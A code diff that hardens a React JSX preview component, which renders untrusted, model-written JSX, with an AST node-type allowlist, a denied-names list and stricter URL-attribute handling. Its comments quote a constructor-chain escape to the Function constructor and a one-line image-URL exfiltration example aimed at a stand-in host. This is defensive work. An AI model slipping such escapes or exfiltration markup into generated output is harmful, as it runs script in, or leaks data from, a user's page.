@@ -10,9 +10,14 @@
  * The JSX is untrusted (a model wrote it) and renders inside the host's page,
  * so only an allowlist of presentational HTML and SVG tags renders, URL
  * attributes keep only safe schemes, markup-injecting attributes are dropped,
- * and `{...}` expressions that could reach a constructor are refused before
- * anything is evaluated. Components the host passes in `components` are
- * trusted and render as given.
+ * and `{...}` expressions are checked against an allowlist of expression
+ * shapes, with no route to a constructor, before anything is evaluated.
+ * Components the host passes in `components` are trusted and render as given.
+ *
+ * What it does not isolate: `style` and `className` are unrestricted, so the
+ * JSX can draw over or imitate the host's own UI (a fake sign-in card). That
+ * is a phishing surface, not script execution; render previews somewhere a
+ * reader can tell apart from the host's chrome. Unknown tags are not rendered.
  *
  * Ported from Vercel AI Elements `JSXPreview` component and adapted for
  * the @flow-state-dev/ui registry conventions.
@@ -31,6 +36,7 @@ import {
   useContext,
   useEffect,
   useMemo,
+  useReducer,
   useRef,
 } from "react";
 import JsxParser from "react-jsx-parser";
@@ -96,15 +102,16 @@ const ALLOWED_URL_SCHEMES = new Set(["http:", "https:", "mailto:", "tel:"]);
 
 /** Attributes (lowercased) whose value is a URL the browser loads or navigates to. */
 const URL_ATTRIBUTES = new Set([
-  "href", "xlinkhref", "xlink:href", "src", "srcset", "action", "formaction", "poster", "cite", "background", "ping",
+  "href", "xlinkhref", "xlink:href", "src", "action", "formaction", "poster", "cite", "background", "ping",
 ]);
 
 /**
  * Attributes (lowercased) dropped outright: React's raw-HTML escape hatch,
- * a document-in-an-attribute, and `form`, which would attach a control to a
- * form elsewhere on the host page.
+ * a document-in-an-attribute, `form`, which would attach a control to a
+ * form elsewhere on the host page, and `srcset`, a list of URLs that a
+ * single-URL scheme check would read only the first of.
  */
-const DROPPED_ATTRIBUTES = new Set(["dangerouslysetinnerhtml", "srcdoc", "form"]);
+const DROPPED_ATTRIBUTES = new Set(["dangerouslysetinnerhtml", "srcdoc", "form", "srcset"]);
 
 /** True when a URL is relative or uses an allowed scheme. */
 function isSafeUrl(value: unknown): boolean {
@@ -142,7 +149,7 @@ const SAFE_INTRINSICS: Record<string, ComponentType<any>> = Object.fromEntries(
 );
 
 // ---------------------------------------------------------------------------
-// Expression check — no route from a literal to the Function constructor
+// Expression check — an allowlist of expression shapes, no route to a constructor
 // ---------------------------------------------------------------------------
 
 /**
@@ -150,12 +157,33 @@ const SAFE_INTRINSICS: Record<string, ComponentType<any>> = Object.fromEntries(
  * The parser evaluates `{...}` expressions, so `"".constructor.constructor`
  * reaches `Function` and `Function("code")()` runs arbitrary script. No
  * globals are in scope, so blocking these names (and property keys computed
- * at runtime, which could spell them) closes that route.
+ * at runtime, which could spell them) closes that route. This is the second
+ * layer; the node-type allowlist below is the first.
  */
 const DENIED_NAMES = new Set([
   "constructor", "prototype", "__proto__",
   "__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__",
 ]);
+
+/**
+ * The only AST node types a preview's JSX may contain: the expressions
+ * previews use, the JSX around them, and the program wrapper. Anything else
+ * (`this`, `new`, tagged templates, optional chaining, assignment,
+ * destructuring, function bodies, and any node type a later parser starts
+ * evaluating) is refused, so the check fails closed on what it doesn't know.
+ */
+const ALLOWED_NODE_TYPES = new Set([
+  "Program", "ExpressionStatement",
+  "Literal", "Identifier", "MemberExpression", "CallExpression", "ArrowFunctionExpression",
+  "ConditionalExpression", "LogicalExpression", "BinaryExpression", "UnaryExpression",
+  "ArrayExpression", "ObjectExpression", "Property", "SpreadElement", "TemplateLiteral", "TemplateElement",
+  "JSXElement", "JSXOpeningElement", "JSXClosingElement", "JSXFragment", "JSXOpeningFragment",
+  "JSXClosingFragment", "JSXAttribute", "JSXSpreadAttribute", "JSXIdentifier", "JSXMemberExpression",
+  "JSXNamespacedName", "JSXExpressionContainer", "JSXEmptyExpression", "JSXText",
+]);
+
+/** Inputs longer than this many characters are refused before they are parsed. */
+export const MAX_JSX_LENGTH = 100_000;
 
 /** The void tags the parser self-closes under `autoCloseVoidElements`; mirrored so both parse alike. */
 const VOID_TAGS = new Set([
@@ -175,57 +203,81 @@ const ExpressionCheckParser = AcornParser.extend(
     } as unknown as typeof AcornParser,
 );
 
-/** The first thing in `node`'s tree that could reach a constructor, or null. */
-function findDeniedAccess(node: unknown): string | null {
+/** What makes this one node disallowed, ignoring its children, or null. */
+function disallowedNode(n: Record<string, any>): string | null {
+  if (!ALLOWED_NODE_TYPES.has(n.type)) return `the expression type "${n.type}"`;
+  switch (n.type) {
+    case "Identifier":
+    case "JSXIdentifier":
+      if (DENIED_NAMES.has(n.name)) return `the name "${n.name}"`;
+      break;
+    case "JSXMemberExpression":
+      // A dotted tag resolves through the component map. Only a capitalized
+      // member (`Card.Header`) names a sub-component; a lower-case one reaches
+      // a function's own fields, and `div.displayName` is the string "div",
+      // which would render a raw intrinsic with unsanitized props.
+      if (!/^[A-Z]/.test(n.property.name)) return `the tag member "${n.property.name}"`;
+      break;
+    case "MemberExpression":
+      if (!n.computed) break; // the property is an Identifier, checked as a child
+      // Only a literal index: a key computed at runtime could spell a denied name.
+      if (n.property.type !== "Literal" || !["string", "number"].includes(typeof n.property.value)) {
+        return "a property key computed at runtime";
+      }
+      if (DENIED_NAMES.has(String(n.property.value))) return `the property "${n.property.value}"`;
+      break;
+    case "Property": {
+      // Computed keys (`{ [k]: v }`) are refused outright: the key is only known at runtime.
+      if (n.computed || n.kind !== "init" || n.method) return "that object key";
+      if (DENIED_NAMES.has(String(n.key.name ?? n.key.value))) return "that object key";
+      break;
+    }
+    case "ArrowFunctionExpression":
+      if (n.async || n.generator) return "an async or generator function";
+      if (!n.params.every((p: { type: string }) => p.type === "Identifier")) return "a destructuring or default parameter";
+      break;
+  }
+  return null;
+}
+
+/** The first node in `node`'s tree that is not allowed, described, or null. */
+function findDisallowed(node: unknown): string | null {
   if (Array.isArray(node)) {
     for (const child of node) {
-      const found = findDeniedAccess(child);
+      const found = findDisallowed(child);
       if (found) return found;
     }
     return null;
   }
-  if (!node || typeof node !== "object") return null;
+  // Only AST nodes carry a string `type`; other objects (a regex literal's
+  // pattern, a template element's text) hold no nodes.
+  if (!node || typeof node !== "object" || typeof (node as { type?: unknown }).type !== "string") return null;
   const n = node as Record<string, any>;
-  switch (n.type) {
-    case "MemberExpression":
-      if (n.computed) {
-        const key = n.property;
-        if (key.type !== "Literal" || typeof key.value === "object") return "a property key computed at runtime";
-        if (DENIED_NAMES.has(String(key.value))) return `the property "${key.value}"`;
-      } else if (DENIED_NAMES.has(n.property.name)) {
-        return `the property "${n.property.name}"`;
-      }
-      break;
-    case "JSXMemberExpression":
-    case "Identifier":
-    case "JSXIdentifier": {
-      const name = n.type === "JSXMemberExpression" ? n.property.name : n.name;
-      if (DENIED_NAMES.has(name)) return `the name "${name}"`;
-      break;
-    }
-    case "Property": {
-      const key = n.computed ? null : (n.key.name ?? n.key.value);
-      if (n.computed || DENIED_NAMES.has(String(key))) return "that object key";
-      break;
-    }
-  }
+  const own = disallowedNode(n);
+  if (own) return own;
   for (const [field, child] of Object.entries(n)) {
-    if (field === "loc" || field === "start" || field === "end") continue;
-    const found = findDeniedAccess(child);
+    if (field === "type" || field === "loc" || field === "start" || field === "end") continue;
+    const found = findDisallowed(child);
     if (found) return found;
   }
   return null;
 }
 
 /**
- * Parse `jsx` the way the renderer will and reject it if any expression could
- * reach a constructor. Fails closed: input this parser cannot read is not
- * rendered, so the renderer never evaluates an expression unchecked.
+ * Parse `jsx` the way react-jsx-parser will (trimmed, DOCTYPEs stripped,
+ * wrapped in `<root>`, void tags self-closed) and return why it may not be
+ * rendered, or null. Fails closed: input this parser cannot read is refused,
+ * so the renderer never evaluates an expression unchecked.
  */
-function checkExpressions(jsx: string): Error | null {
+export function checkExpressions(jsx: string): Error | null {
+  if (jsx.length > MAX_JSX_LENGTH) {
+    return new Error(`The JSX is longer than ${MAX_JSX_LENGTH} characters, which is too long for a preview.`);
+  }
+  // react-jsx-parser's render() applies exactly this before parsing.
+  const source = jsx.trim().replace(/<!DOCTYPE([^>]*)>/g, "");
   try {
-    const ast = ExpressionCheckParser.parse(`<root>${jsx}</root>`, { ecmaVersion: "latest" });
-    const denied = findDeniedAccess(ast);
+    const ast = ExpressionCheckParser.parse(`<root>${source}</root>`, { ecmaVersion: "latest" });
+    const denied = findDisallowed(ast);
     return denied ? new Error(`The JSX uses ${denied}, which is not allowed in a preview.`) : null;
   } catch (err) {
     return err instanceof Error ? err : new Error(String(err));
@@ -254,15 +306,14 @@ function parseJsx(
   components: Record<string, ComponentType<any>>,
   bindings: Record<string, unknown>,
 ): ParseResult {
-  // The parser renders this exact string; check the same one.
-  const source = jsx.trim().replace(/<!DOCTYPE([^>]*)>/g, "");
-  const denied = checkExpressions(source);
+  // Checked as the parser will read it; see checkExpressions.
+  const denied = checkExpressions(jsx);
   if (denied) return { nodes: null, error: denied };
 
   let error: Error | null = null;
   const parser = new JsxParser({
     ...JsxParser.defaultProps,
-    jsx: source,
+    jsx,
     // Host components win over the allowlist: the host chose them. No
     // prototype, so a tag named `constructor` or `toString` resolves to nothing.
     components: Object.assign(Object.create(null), SAFE_INTRINSICS, components),
@@ -308,9 +359,13 @@ export interface JSXPreviewProps {
   isStreaming?: boolean;
   /** Map of component names available inside the JSX. Trusted: rendered as given. */
   components?: Record<string, ComponentType<any>>;
-  /** Map of variable bindings available inside the JSX. */
+  /**
+   * Map of variable bindings available inside the JSX. Trusted data, but the
+   * JSX can read all of it and send it out (`<img src={"https://x/?" + v} />`),
+   * so bind only what the preview may show.
+   */
   bindings?: Record<string, unknown>;
-  /** Called when a render error occurs. */
+  /** Called once per distinct parse or guard error, after commit. */
   onError?: (error: Error) => void;
   children?: ReactNode;
   className?: string;
@@ -318,6 +373,19 @@ export interface JSXPreviewProps {
 
 const NO_COMPONENTS: Record<string, ComponentType<any>> = {};
 const NO_BINDINGS: Record<string, unknown> = {};
+
+/** The result last shown, and the nodes on screen for it. */
+interface Shown {
+  result: ParseResult | null;
+  nodes: ReactNode;
+}
+
+const INITIAL_SHOWN: Shown = { result: null, nodes: null };
+
+/** Show a new result, keeping the previous nodes while it is an error. */
+function showResult(prev: Shown, result: ParseResult): Shown {
+  return { result, nodes: result.error ? prev.nodes : result.nodes };
+}
 
 export function JSXPreview({
   jsx,
@@ -339,21 +407,30 @@ export function JSXPreview({
     [isEmpty, completedJsx, components, bindings],
   );
 
-  // Remembers the last committed render that parsed, to show while a later
-  // input fails. History, not derivable from the current props, so it is
-  // written after commit rather than during render.
-  const lastGoodRef = useRef<ReactNode>(null);
-  useEffect(() => {
-    if (!result.error) lastGoodRef.current = result.nodes;
-  }, [result]);
+  // What to show: the current render, or the last one that parsed while the
+  // current input fails. That is history, not derivable from the current
+  // props, so it is state, advanced during render whenever the result changes
+  // (React re-runs this render with the new state before committing).
+  const [shown, show] = useReducer(showResult, INITIAL_SHOWN);
+  if (shown.result !== result) show(result);
+  const nodes = shown.nodes;
 
   // Notifies the host of a new parse error: a call out of the component, so
-  // it runs after commit, once per distinct error.
+  // it runs after commit. The handler is read through a ref because hosts
+  // usually pass an inline one, a new function every render; depending on it
+  // would notify on every host render, and a handler that sets host state
+  // would loop. Deduped by message, because inline `bindings` or `components`
+  // re-derive an equal error on every host render too.
+  const onErrorRef = useRef(onError);
   useEffect(() => {
-    if (result.error) onError?.(result.error);
-  }, [result.error, onError]);
-
-  const nodes = result.error ? lastGoodRef.current : result.nodes;
+    onErrorRef.current = onError;
+  }, [onError]);
+  const reportedRef = useRef<string | null>(null);
+  useEffect(() => {
+    const message = result.error?.message ?? null;
+    if (result.error && message !== reportedRef.current) onErrorRef.current?.(result.error);
+    reportedRef.current = message;
+  }, [result.error]);
 
   const ctx = useMemo(
     () => ({ nodes, isEmpty, error: result.error }),
